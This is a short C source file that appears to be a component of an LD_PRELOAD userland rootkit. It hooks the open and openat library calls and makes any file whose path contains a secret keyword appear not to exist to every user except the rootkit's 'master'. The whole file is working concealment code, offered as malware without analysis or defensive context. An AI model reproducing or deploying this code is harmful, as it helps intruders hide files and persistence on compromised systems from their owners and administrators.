#define _GNU_SOURCE
/*
*
*@@@ landy @@@
*Hooks open system calls
*
*/

#include "h00kDir.h"

int (*old_open)(const char *pathname, int flags, mode_t mode);
int (*old_openat)(int dirfd, const char *pathname, int flags, mode_t mode);

int open(const char *pathname, int flags, mode_t mode ){
    
    #ifdef DEBUG
	printf("open hooked\n");
    #endif

    if(!old_open){
	old_open = dlsym(RTLD_NEXT,"open");
    }

    if(strstr(pathname, keyword)){
	if(ismaster() != 0){
	    errno = ENOENT;
	    return -1;
	}
    }

    return old_open(pathname, flags, mode);

}

int openat(int dirfd, const char *pathname, int flags, mode_t mode ){
    
    #ifdef DEBUG
	printf("openat hooked\n");
    #endif

    if(!old_openat){
	old_openat = dlsym(RTLD_NEXT,"openat");
    }

    if(strstr(pathname, keyword)){
	if(ismaster() != 0){
	    errno = ENOENT;
	    return -1;
	}
    }

    return old_openat(dirfd, pathname, flags, mode);

}
